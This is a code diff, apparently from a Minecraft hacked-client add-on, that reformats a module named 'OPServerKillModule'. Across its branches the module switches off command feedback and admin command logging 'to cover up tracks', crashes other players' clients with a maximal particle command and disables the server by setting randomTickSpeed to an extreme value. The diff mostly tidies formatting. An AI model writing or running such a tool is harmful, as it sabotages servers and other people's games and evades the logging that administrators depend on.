@@ -1,7 +1,10 @@
 package pwn.noobs.trouserstreak.modules;
 
 import meteordevelopment.meteorclient.events.world.TickEvent;
-import meteordevelopment.meteorclient.settings.*;
+import meteordevelopment.meteorclient.settings.BoolSetting;
+import meteordevelopment.meteorclient.settings.IntSetting;
+import meteordevelopment.meteorclient.settings.Setting;
+import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.friends.Friends;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.utils.player.ChatUtils;
@@ -68,12 +71,11 @@ public class OPServerKillModule extends Module {
             .sliderRange(0, 2147483647)
             .build()
     );
+    private int ticks = 0;
+    private CopyOnWriteArrayList<PlayerListEntry> players;
     public OPServerKillModule() {
         super(Trouser.Main, "OPServerKillModule", "Runs a set of commands to disable a server. Requires OP. (ONLY USE IF YOU'RE 100% SURE)");
     }
-
-    private int ticks=0;
-    private CopyOnWriteArrayList<PlayerListEntry> players;
 
     @Override
     public void onActivate() {
@@ -86,149 +88,152 @@ public class OPServerKillModule extends Module {
             toggle();
             error("Must have permission level 2 or higher");
         }
-        ticks=0;
+        ticks = 0;
     }
 
     @EventHandler
     public void onTick(TickEvent.Pre event) {
         ticks++;
-        if (sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
-            if (ticks == tickdelay.get()){ //prevent people from seeing the commands being executed
+        if (sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()) {
+            if (ticks == tickdelay.get()) { //prevent people from seeing the commands being executed
                 ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
             }
-            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
+            if (ticks == 2 * tickdelay.get()) { //prevent console logging the command to cover up tracks
                 ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
             }
-            if (ticks == 3*tickdelay.get()){ //kill server
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            if (ticks == 3 * tickdelay.get()) { //kill server
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
             }
-            if (ticks > 3*tickdelay.get()){
+            if (ticks > 3 * tickdelay.get()) {
                 toggle();
                 error("Server Killed.");
             }
-        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()){
-            if (ticks == tickdelay.get()){
+        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && !crashOtherPlayers.get()) {
+            if (ticks == tickdelay.get()) {
                 ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
             }
-            if (ticks == 2*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            if (ticks == 2 * tickdelay.get()) {
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
             }
-            if (ticks > 2*tickdelay.get()){
+            if (ticks > 2 * tickdelay.get()) {
                 toggle();
                 error("Server Killed.");
             }
-        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
-            if (ticks == tickdelay.get()){
+        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()) {
+            if (ticks == tickdelay.get()) {
                 ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
             }
-            if (ticks == 2*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            if (ticks == 2 * tickdelay.get()) {
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
             }
-            if (ticks > 2*tickdelay.get()){
+            if (ticks > 2 * tickdelay.get()) {
                 toggle();
                 error("Server Killed.");
             }
-        } else if (!sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()){
-            if (ticks == tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+        } else if (!sendCommandFeedback.get() && !logAdminCommands.get() && !crashOtherPlayers.get()) {
+            if (ticks == tickdelay.get()) {
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
             }
-            if (ticks > tickdelay.get()){
+            if (ticks > tickdelay.get()) {
                 toggle();
                 error("Server Killed.");
             }
-        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
-            if (ticks == tickdelay.get()){
+        } else if (!sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()) {
+            if (ticks == tickdelay.get()) {
                 ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
             }
-            if (ticks == 2*tickdelay.get()){ //crash players
+            if (ticks == 2 * tickdelay.get()) { //crash players
                 if (mc.player == null) return;
-                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
+                if (!nocrashfrend.get())
+                    ChatUtils.sendPlayerMsg("/execute at @a[name=!" + mc.player.getName().getLiteralString() + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!" + mc.player.getName().getLiteralString() + "]");
                 else if (nocrashfrend.get()) {
                     players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                     List<String> friendNames = new ArrayList<>();
                     friendNames.add("name=!" + mc.player.getName().getLiteralString());
-                    for(PlayerListEntry player : players) {
-                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
+                    for (PlayerListEntry player : players) {
+                        if (Friends.get().isFriend(player) && nocrashfrend.get())
+                            friendNames.add("name=!" + player.getProfile().getName());
                     }
                     String friendsString = String.join(",", friendNames);
                     String thecommand = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
-                    if (thecommand.length()<=256){
+                    if (thecommand.length() <= 256) {
                         ChatUtils.sendPlayerMsg(thecommand);
-                    }
-                    else {
+                    } else {
                         error("Crash all players command is too long, you have too many friends online.");
                     }
                 }
             }
-            if (ticks == 3*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            if (ticks == 3 * tickdelay.get()) {
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
             }
-            if (ticks > 3*tickdelay.get()){
+            if (ticks > 3 * tickdelay.get()) {
                 toggle();
                 error("Server Killed.");
             }
-        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && crashOtherPlayers.get()){
-            if (ticks == tickdelay.get()){ //prevent people from seeing the commands being executed
+        } else if (sendCommandFeedback.get() && !logAdminCommands.get() && crashOtherPlayers.get()) {
+            if (ticks == tickdelay.get()) { //prevent people from seeing the commands being executed
                 ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
             }
-            if (ticks == 2*tickdelay.get()){ //crash players
+            if (ticks == 2 * tickdelay.get()) { //crash players
                 if (mc.player == null) return;
-                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
+                if (!nocrashfrend.get())
+                    ChatUtils.sendPlayerMsg("/execute at @a[name=!" + mc.player.getName().getLiteralString() + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!" + mc.player.getName().getLiteralString() + "]");
                 else if (nocrashfrend.get()) {
                     players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                     List<String> friendNames = new ArrayList<>();
                     friendNames.add("name=!" + mc.player.getName().getLiteralString());
-                    for(PlayerListEntry player : players) {
-                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
+                    for (PlayerListEntry player : players) {
+                        if (Friends.get().isFriend(player) && nocrashfrend.get())
+                            friendNames.add("name=!" + player.getProfile().getName());
                     }
                     String friendsString = String.join(",", friendNames);
                     String thecommand2 = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
-                    if (thecommand2.length()<=256){
+                    if (thecommand2.length() <= 256) {
                         ChatUtils.sendPlayerMsg(thecommand2);
-                    }
-                    else {
+                    } else {
                         error("Crash all players command is too long, you have too many friends online.");
                     }
                 }
             }
-            if (ticks == 3*tickdelay.get()){
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            if (ticks == 3 * tickdelay.get()) {
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
             }
-            if (ticks > 3*tickdelay.get()){
+            if (ticks > 3 * tickdelay.get()) {
                 toggle();
                 error("Server Killed.");
             }
-        } else if (sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()){
-            if (ticks == tickdelay.get()){ //prevent people from seeing the commands being executed
+        } else if (sendCommandFeedback.get() && logAdminCommands.get() && crashOtherPlayers.get()) {
+            if (ticks == tickdelay.get()) { //prevent people from seeing the commands being executed
                 ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
             }
-            if (ticks == 2*tickdelay.get()){ //prevent console logging the command to cover up tracks
+            if (ticks == 2 * tickdelay.get()) { //prevent console logging the command to cover up tracks
                 ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
             }
-            if (ticks == 3*tickdelay.get()){ //crash players
+            if (ticks == 3 * tickdelay.get()) { //crash players
                 if (mc.player == null) return;
-                if (!nocrashfrend.get())ChatUtils.sendPlayerMsg("/execute at @a[name=!"+mc.player.getName().getLiteralString()+"] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!"+mc.player.getName().getLiteralString()+"]");
+                if (!nocrashfrend.get())
+                    ChatUtils.sendPlayerMsg("/execute at @a[name=!" + mc.player.getName().getLiteralString() + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[name=!" + mc.player.getName().getLiteralString() + "]");
                 else if (nocrashfrend.get()) {
                     players = new CopyOnWriteArrayList<>(mc.getNetworkHandler().getPlayerList());
                     List<String> friendNames = new ArrayList<>();
                     friendNames.add("name=!" + mc.player.getName().getLiteralString());
-                    for(PlayerListEntry player : players) {
-                        if(Friends.get().isFriend(player) && nocrashfrend.get()) friendNames.add("name=!" + player.getProfile().getName());
+                    for (PlayerListEntry player : players) {
+                        if (Friends.get().isFriend(player) && nocrashfrend.get())
+                            friendNames.add("name=!" + player.getProfile().getName());
                     }
                     String friendsString = String.join(",", friendNames);
                     String thecommand2 = "/execute at @a[" + friendsString + "] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[" + friendsString + "]";
-                    if (thecommand2.length()<=256){
+                    if (thecommand2.length() <= 256) {
                         ChatUtils.sendPlayerMsg(thecommand2);
-                    }
-                    else {
+                    } else {
                         error("Crash all players command is too long, you have too many friends online.");
                     }
                 }
             }
-            if (ticks == 4*tickdelay.get()){ //kill server
-                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed "+killvalue.get());
+            if (ticks == 4 * tickdelay.get()) { //kill server
+                ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
             }
-            if (ticks > 4*tickdelay.get()){ //kill server
+            if (ticks > 4 * tickdelay.get()) { //kill server
                 toggle();
                 error("Server Killed.");
             }
